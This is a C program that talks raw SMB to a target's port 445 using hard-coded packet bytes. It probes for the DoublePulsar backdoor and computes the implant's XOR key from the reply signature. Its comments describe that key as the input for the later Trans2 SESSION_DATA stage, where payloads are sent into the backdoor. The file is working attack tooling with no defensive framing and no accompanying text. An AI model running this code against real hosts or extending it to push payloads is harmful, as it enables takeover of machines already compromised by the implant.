#define _CRT_SECURE_NO_WARNINGS

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <winsock.h>
#pragma comment(lib, "wsock32.lib")

unsigned char SmbNegociate[] =
"\x00\x00\x00\x2f\xff\x53\x4d\x42\x72\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x88\x05\x00\x00\x00\x00\x00\x0c\x00\x02\x4e\x54"
"\x20\x4c\x4d\x20\x30\x2e\x31\x32\x00";

unsigned char Session_Setup_AndX_Request[] =
"\x00\x00\x00\x48\xff\x53\x4d\x42\x73\x00"
"\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\xff\xff\x88\x05\x00\x00\x00\x00\x0d\xff\x00\x00\x00\xff"
"\xff\x02\x00\x88\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x01\x00\x00\x00\x0b\x00\x00\x00\x6e\x74\x00\x70\x79\x73\x6d"
"\x62\x00";

unsigned char treeconnect[] =
"\x00\x00\x00\x60\xff\x53\x4d\x42\x75\x00\x00\x00\x00\x18\x07\xc0"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xfe"
"\x00\x08\x40\x00\x04\xff\x00\x60\x00\x08\x00\x01\x00\x35\x00\x00"
"\x5c\x00\x5c\x00\x31\x00\x39\x00\x32\x00\x2e\x00\x31\x00\x36\x00"
"\x38\x00\x2e\x00\x31\x00\x37\x00\x35\x00\x2e\x00\x31\x00\x32\x00"
"\x38\x00\x5c\x00\x49\x00\x50\x00\x43\x00\x24\x00\x00\x00\x3f\x3f\x3f\x3f\x3f\x00";

unsigned char trans2_session_setup[] =
"\x00\x00\x00\x4E\xFF\x53\x4D\x42\x32\x00\x00\x00\x00\x18\x07\xC0"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xFF\xFE"
"\x00\x08\x41\x00\x0F\x0C\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00"
"\x00\xA6\xD9\xA4\x00\x00\x00\x0C\x00\x42\x00\x00\x00\x4E\x00\x01"
"\x00\x0E\x00\x0D\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00";

unsigned int ComputeDOUBLEPULSARXorKey(unsigned int sig)
{
	unsigned int x = (2 * sig ^ (((sig & 0xff00 | (sig << 16)) << 8) | (((sig >> 16) | sig & 0xff0000) >> 8))) & 0xffffffff;
	return x;
}

unsigned char recvbuff[2048];
int main(int argc, char* argv[])
{
	WSADATA    ws;
	struct sockaddr_in server;
	SOCKET    sock;
	DWORD    ret;
	WORD    userid, treeid, processid, multiplexid;

	WSAStartup(MAKEWORD(2, 2), &ws);

	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock <= 0)
	{
		return 0;
	}
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = inet_addr(argv[1]);
	server.sin_port = htons((USHORT)445);
	ret = connect(sock, (struct sockaddr*) & server, sizeof(server));

	//send SMB negociate packet
	send(sock, (char*)SmbNegociate, sizeof(SmbNegociate) - 1, 0);
	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);

	//send Session Setup AndX request
	printf("sending Session_Setup_AndX_Request!\n");
	ret = send(sock, (char*)Session_Setup_AndX_Request, sizeof(Session_Setup_AndX_Request) - 1, 0);
	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);

	//copy our returned userID value from the previous packet to the TreeConnect request packet
	userid = *(WORD*)(recvbuff + 0x20);       //get userid

	//update UserID in modified TreeConnect Request
	memcpy(treeconnect + 0x20, (char*)&userid, 2); //update userid

	//send TreeConnect request packet
	printf("sending TreeConnect Request!\n");
	send(sock, (char*)treeconnect, sizeof(treeconnect) - 1, 0);
	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);

	//copy the treeID from the TreeConnect response
	treeid = *(WORD*)(recvbuff + 0x1c);       //get treeid

	memcpy(trans2_session_setup + 0x20, (char*)&userid, 2);  //update userid
	memcpy(trans2_session_setup + 0x1c, (char*)&treeid, 2);  //update treeid

	//if DoublePulsar is enabled, the multiplex ID is incremented by 10
	//will return x52 or 82
	send(sock, (char*)trans2_session_setup, sizeof(trans2_session_setup) - 1, 0);
	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);

	unsigned char signature[5];
	unsigned int sig;
	//copy SMB signature from recvbuff to local buffer
	signature[0] = recvbuff[18];
	signature[1] = recvbuff[19];
	signature[2] = recvbuff[20];
	signature[3] = recvbuff[21];
	signature[4] = recvbuff[22];
	int i;
	printf("Received the following SMB signature from DoublePulsar:  ");
	for (i = 18; i < 22; i++)
	{
		printf("0x%x ", recvbuff[i]);
	}
	printf("\n");
	
	printf("The following SMB signature saved to local buffer:  ");
	for (i = 0; i < 5; i++)
	{
		printf("0x%x ", signature[i]);
	}
	printf("\n");

	//convert the signature buffer to unsigned integer 
	memcpy((unsigned int*)&sig, (unsigned int*)&signature, sizeof(unsigned int));

	//calculate the XOR key for DoublePulsar
	unsigned int XorKey = ComputeDOUBLEPULSARXorKey(sig);
	printf("Calculated XOR KEY:  0x%x\n", XorKey);

	//will use for re-sending the computed XOR key in the Trans2 SESSION_DATA parameters
	unsigned char c[5];

	c[0] = XorKey & 0xFF;
	c[1] = (XorKey >> 8) & 0xFF;
	c[2] = (XorKey >> 8 >> 8) & 0xFF;
	c[3] = (XorKey >> 8 >> 8 >> 8) & 0xFF;
	c[4] = (XorKey >> 8 >> 8 >> 8 >> 8) & 0xFF;

	printf("XOR Key in characters ( needed for DoublePulsar SESSION Data )\n");
	printf("c[0] = %x \n", c[0]);
	printf("c[1] = %x \n", c[1]);
	printf("c[2] = %x \n", c[2]);
	printf("c[3] = %x \n", c[3]);

	closesocket(sock);
	WSACleanup();
	return 0;
}
